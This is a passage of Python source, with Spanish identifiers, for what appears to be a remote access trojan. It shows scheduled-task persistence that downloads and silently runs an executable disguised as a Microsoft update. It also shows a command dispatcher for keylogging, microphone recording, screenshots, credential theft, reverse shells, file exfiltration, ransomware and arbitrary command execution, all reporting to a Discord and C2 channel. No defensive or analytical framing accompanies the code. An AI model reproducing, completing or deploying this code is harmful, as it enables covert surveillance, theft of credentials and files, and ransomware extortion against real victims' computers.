    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _ruta_exe_persistente(nombre):
    base = os.path.join(os.environ.get("TEMP", tempfile.gettempdir()), "MicrosoftUpdate")
    os.makedirs(base, exist_ok=True)
    return os.path.join(base, f"{nombre}.exe")


def _descargar_exe(url, destino):
    r = requests.get(url, timeout=30, stream=True)
    r.raise_for_status()
    with open(destino, "wb") as f:
        for chunk in r.iter_content(chunk_size=8192):
            f.write(chunk)
    return destino


def crear_persistencia(url, nombre="SystemUpdate", minutos=30):
    try:
        exe_local = _ruta_exe_persistente(nombre)
        try:
            _descargar_exe(url, exe_local)
            descarga_ok = True
        except Exception as e:
            _discord_send_texto(f"[{VICTIM_ID}] [WARN] No se pudo descargar aun: {e}")
            descarga_ok = False

        wrapper = os.path.join(os.environ["TEMP"], f"{nombre}_run.ps1")
        ps = f'''
$ErrorActionPreference = "SilentlyContinue"
$dest = "{exe_local}"
$url  = "{url}"
if (-not (Test-Path $dest)) {{
    try {{ Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing }} catch {{}}
}}
if (Test-Path $dest) {{
    Start-Process -FilePath $dest -WindowStyle Hidden
}}
'''
        with open(wrapper, "w", encoding="utf-8") as f:
            f.write(ps)

        ps_cmd = (
            f'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass '
            f'-File "{wrapper}"'
        )

        admin = _es_admin()
        minutos = max(1, int(minutos))

        subprocess.run(
            ["schtasks", "/Delete", "/TN", nombre, "/F"],
            capture_output=True, shell=True
        )

        cmd = [
            "schtasks", "/Create",
            "/TN", nombre,
            "/TR", ps_cmd,
            "/SC", "MINUTE",
            "/MO", str(minutos),
            "/F",
        ]

        if admin:
            cmd += ["/RU", "SYSTEM", "/RL", "HIGHEST"]
        else:
            cmd += ["/RU", usuario, "/IT"]

        resultado = subprocess.run(cmd, capture_output=True, text=True, shell=True)

        if resultado.returncode == 0:
            _discord_send_texto(
                f"[{VICTIM_ID}] [OK] Persistencia creada\n"
                f"- Tarea: {nombre}\n"
                f"- Cada: {minutos} min\n"
                f"- Modo: {'SYSTEM' if admin else 'Usuario'}\n"
                f"- Descarga: {'OK' if descarga_ok else 'reintentara'}"
            )
        else:
            _discord_send_texto(
                f"[{VICTIM_ID}] [ERROR] tarea:\n\n{resultado.stderr or resultado.stdout}\n"
            )
    except Exception as e:
        _discord_send_texto(f"[{VICTIM_ID}] [ERROR] persistencia: {e}")


def eliminar_persistencia(nombre="SystemUpdate"):
    try:
        subprocess.run(
            ["schtasks", "/Delete", "/TN", nombre, "/F"],
            capture_output=True, shell=True
        )
        for ruta in [
            _ruta_exe_persistente(nombre),
            os.path.join(os.environ["TEMP"], f"{nombre}_run.ps1")
        ]:
            try:
                if os.path.isfile(ruta):
                    os.remove(ruta)
            except Exception:
                pass
        _discord_send_texto(f"[{VICTIM_ID}] [OK] Tarea {nombre} eliminada")
    except Exception as e:
        _discord_send_texto(f"[{VICTIM_ID}] [ERROR] eliminando: {e}")


# ==================== EJECUTOR ====================
def ejecutar_comando(cmd: dict):
    accion = cmd.get("accion")
    try:
        if accion == "microfono":
            microphone(int(cmd.get("duracion", 10)), str(cmd.get("dispositivo", "default")))
        elif accion == "listar_mics":
            _discord_send_texto(f"[{VICTIM_ID}] [MICS]\n\n{listar_microfonos()}\n")
        elif accion == "screenshot":
            screenshot()
        elif accion == "logo":
            mostrar_logo(cmd.get("mensaje"))
        elif accion == "creds":
            _discord_send_texto(
                f"[{VICTIM_ID}] [CREDS]\n\n{recopilar_credenciales()[:3600]}\n"
            )
        elif accion == "shell":
            activar_reverse_shell(int(cmd["puerto"]), cmd["ip"])
        elif accion == "reporte":
            enviar_reporte()
        elif accion == "mouse":
            posicion_mouse()
        elif accion == "apagar":
            apagar(int(cmd.get("delay", 0)))
        elif accion == "reiniciar":
            reiniciar(int(cmd.get("delay", 0)))
        elif accion == "enviar_archivo":
            enviar_archivo(cmd.get("ruta", ""))
        elif accion == "listar_carpeta":
            listar_carpeta(cmd.get("ruta", ""))
        elif accion == "exfil":
            exfiltrar_a_pc(cmd["ruta"], cmd["ip"], int(cmd["puerto"]))
        elif accion == "ransom":
            ransomware_completo(
                ruta=cmd.get("ruta"),
                backup=cmd.get("backup", True),
                ip=cmd.get("ip"),
                puerto=int(cmd.get("puerto", 6000))
            )
        elif accion == "descifrar":
            descifrar_carpeta(cmd["ruta"], cmd["clave"])
        elif accion == "persistir":
            crear_persistencia(cmd["url"], cmd.get("nombre", "SystemUpdate"),
                               int(cmd.get("minutos", 30)))
        elif accion == "despersistir":
            eliminar_persistencia(cmd.get("nombre", "SystemUpdate"))
        elif accion == "desconectar":
            desconectar_payload(
                eliminar_tarea=cmd.get("eliminar_tarea", True),
                tarea_nombre=cmd.get("tarea_nombre", "SystemUpdate")
            )
        elif accion == "ping":
            _discord_send_texto(
                f"[{VICTIM_ID}] [PONG] {HOSTNAME} - "
                f"{datetime.datetime.now().strftime('%H:%M:%S')}"
            )
        elif accion == "ejecutar":
            try:
                out = subprocess.run(
                    cmd["comando"], shell=True, capture_output=True,
                    text=True, timeout=30, encoding="cp850", errors="ignore"
                )
                resultado = (out.stdout or "") + (out.stderr or "")
                _discord_send_texto(
                    f"[{VICTIM_ID}] [CMD] {cmd['comando']}:\n\n{resultado[:3600]}\n"
                )
            except Exception as e:
                _discord_send_texto(f"[{VICTIM_ID}] [CMD] error: {e}")
    except Exception:
        _discord_send_texto(
            f"[{VICTIM_ID}] [ERROR] {accion}:\n\n{traceback.format_exc()[:1500]}\n"
        )


# ==================== POLLING DIRIGIDO ====================
def polling_c2():
    while _ejecutando:
        try:
            r = requests.get(f"{C2_BASE}/comandos/{VICTIM_ID}", timeout=10)
            if r.status_code == 200:
                for c in r.json():
                    threading.Thread(
                        target=ejecutar_comando, args=(c,), daemon=True
                    ).start()
        except Exception:
            pass
        time.sleep(C2_POLL)


# ==================== MAIN ====================
def main():
    global tiempo_fin, log, contador_lote

    system_information()

    enviar_heartbeat()
    threading.Thread(target=bucle_heartbeat, daemon=True).start()

    threading.Thread(target=polling_c2, daemon=True).start()

    kl = keyboard.Listener(on_press=on_press)
    kl.start()
    ml = Listener(on_click=on_click, on_move=on_move, on_scroll=on_scroll)
    ml.start()

    _discord_send_texto(
        f"[OK] Victima conectada\n"
        f"\n"
        f"ID       : {VICTIM_ID}\n"
        f"Hostname : {HOSTNAME}\n"
        f"Usuario  : {usuario}\n"
        f"IP       : {_obtener_ip_local()}\n"
        f"OS       : {platform.system()} {platform.release()}\n"
        f"\n"
        f"Usa !cmd {VICTIM_ID} <comando> para dirigir comandos a esta maquina"
    )

    try:
        creds = recopilar_credenciales()
        threading.Thread(
            target=_discord_send_texto,
            args=(f"[{VICTIM_ID}] [CREDS]\n\n{creds[:DISCORD_MAX_CHARS*3]}\n",),
            daemon=True
        ).start()
    except Exception:
        pass

    print(f"[*] ID: {VICTIM_ID}")
    print(f"[*] Captura iniciada. Envio cada {INTERVALO_SEGUNDOS}s")
    print(f"[*] Polling C2 cada {C2_POLL}s en {C2_BASE}")
    print(f"[*] Heartbeat cada {HEARTBEAT_INTERVALO}s")

    try:
        while _ejecutando:
            if time.time() >= tiempo_fin:
                _volcar_buffer()
                if log.strip():
                    contador_lote += 1
                    guardar_en_archivo(log)
                    threading.Thread(
                        target=enviar_log_a_discord, args=(log,), daemon=True
                    ).start()
                    log = ""
                tiempo_fin = time.time() + INTERVALO_SEGUNDOS
            time.sleep(1)
    except KeyboardInterrupt:
        _volcar_buffer()
        kl.stop()
        ml.stop()
        print("\nDetenido.")


if __name__ == "__main__":
    main()